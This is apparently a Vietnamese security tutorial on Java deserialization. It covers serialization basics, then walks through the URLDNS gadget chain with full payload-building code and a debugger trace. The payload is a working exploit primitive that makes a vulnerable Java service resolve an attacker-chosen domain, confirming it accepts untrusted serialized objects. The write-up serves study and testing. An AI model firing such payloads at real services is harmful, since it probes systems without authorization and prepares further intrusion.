## Giới thiệu về Serialize và Deserialize:

  **Serialize** là quá trình chuyển đổi từ một object sang dạng chuỗi byte và quá trình chuyển ngược lại từ chuỗi byte sang một object gọi là **Deserialize**.
  
  ví dụ mình tạo một object tên là SampleObject, object có property message và constructor print message:
  
  ```java
  import java.io.Serializable;

  public class SampleObject implements Serializable {
    private String message;
    public static void SampleOject(String mesage){
        System.out.print(mesage);
    }

    public String getMessage() {
        return message;
    }

    public void setMessage(String message) {
        this.message = message;
    }
}
```
set message là `hello_world` sau đó **serialize**:

```java
  FileOutputStream fileOutputStream = new FileOutputStream("path_to_file\\demo.ser");
  ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
  SampleObject demo = new SampleObject();
  demo.setMessage("hello_world\n");
  objectOutputStream.writeObject(demo);
  objectOutputStream.flush();
  objectOutputStream.close();
```
![](https://github.com/NgoXuanHao/Deserialize-Java/blob/main/URLDNS/image/demo_serialize.png)

và sau khi **deserialize** ta có thể nhận được object ban đầu và cả giá trị property message

```java
   ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("path_to_file\\demo.ser"));
   SampleObject sampleObject = (SampleObject) objectInputStream.readObject();
   String newMessage = sampleObject.getMessage();
   System.out.printf(newMessage);
```
![](https://github.com/NgoXuanHao/Deserialize-Java/blob/main/URLDNS/image/demo_deserialize.png)

java deserialize là lỗi lợi dụng những method deserialize object mà ta có thể control được sau đó tìm cách chain đến method có thể thực hiện chức năng mà mình muốn, thường là request DNS hoặc RCE.

## URLDNS

Đây là gadget chain với mục đích cuối là tạo một request DNS đến domain bất kỳ.

`Hashmap` là tập hợp của cặp `key` và `value`, trong trường hợp này cặp `key-value` là object URL và url mình muốn request dns tới.
```java
 HashMap hashMap = new HashMap();
 URL url1 = new URL(null, url, urlStreamHandler);
 hashMap.put(url1, url);
 ```
 vì trong `java/net/URL.java#hashCode()` có đoạn check thử hashmap có được cache chưa, nếu rồi thì sẽ không đi tiếp nữa mà return giá trị luôn:
 ```java 
     public synchronized int hashCode() {
        if (hashCode != -1)
            return hashCode;

        hashCode = handler.hashCode(this);
        return hashCode;
    }
 ```
 Để đi tiếp thì hashCode phải bằng -1 do đó ta cần dùng reflection để gán giá trị cho hashCode.
 Cú pháp như sau, đầu tiên ta cần lấy hashcode từ URL class:
 ```java
 Field field = URL.class.getDeclaredField("hashCode");
 ```
 Tiếp theo đó xét quyền truy cập này vì trong class URL này được khai báo dạng private:
 ```java
 field.setAccessible(true);
 ```
 cuối cùng là set giá trị cho hashCode trong object url mình tạo
 ```java
 field.set(url1, -1);
 ```
 ### Debug
 Đây là code tạo payload mình làm dựa theo ysoserial
 ```java
  URLStreamHandler urlStreamHandler = new URLStreamHandler() {
     @Override
     protected URLConnection openConnection(URL u) throws IOException {
         return null;
     }
 };
 HashMap hashMap = new HashMap();
 URL url1 = new URL(null, url, urlStreamHandler);
 hashMap.put(url1, url);
 Field field = URL.class.getDeclaredField("hashCode");
 field.setAccessible(true);
 field.set(url1, -1);

 FileOutputStream fileOutputStream = new FileOutputStream("path_to_file\\test2.ser");
 ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
 objectOutputStream.writeObject(hashMap);
 objectOutputStream.flush();
 objectOutputStream.close();
 ```                   
 còn đây là đoạn code đọc object:
 ```java 
   ObjectInputStream payload = new ObjectInputStream(new FileInputStream("path_to_file\\test2.ser"));
  HashMap demoHashMap = (HashMap) payload.readObject();
 ```
 BBắt đầu đặt breakpoint từ method readObject, ta thấy sau khi readObject sẽ gọi tới `putVal()` nằm trong method `HashMap.readObject()`
 ![](https://github.com/NgoXuanHao/Deserialize-Java/blob/main/URLDNS/image/putVal_readObject.png)
 Tiếp theo HashMap.putVal() sẽ call tới HashMap.hash(), ta thấy key ở đây được nhận dưới dạng là một object do đó từ đây ta có thể lợi dụng để đi tới class khác.
 ![](https://github.com/NgoXuanHao/Deserialize-Java/blob/main/URLDNS/image/HashMap_hash.png)
 Tại đây method này gọi tới method URL.hashCode với object key vừa được truyền vào.
 ![](https://github.com/NgoXuanHao/Deserialize-Java/blob/main/URLDNS/image/URL_hashcode.png)
 Tại đây ta có thể thấy property hashCode đã được gán -1 như đã nói ở trên. Từ đây gọi tới URLStreamHandler.hashCode()
 ![](https://github.com/NgoXuanHao/Deserialize-Java/blob/main/URLDNS/image/URLStreamHandler.hashCode.png)
 và method này sẽ gọi tới getHostAddress tại đây sẽ resolve dns domain mà ta truyền vào.
 ![](https://github.com/NgoXuanHao/Deserialize-Java/blob/main/URLDNS/image/result.png)
 
 
 
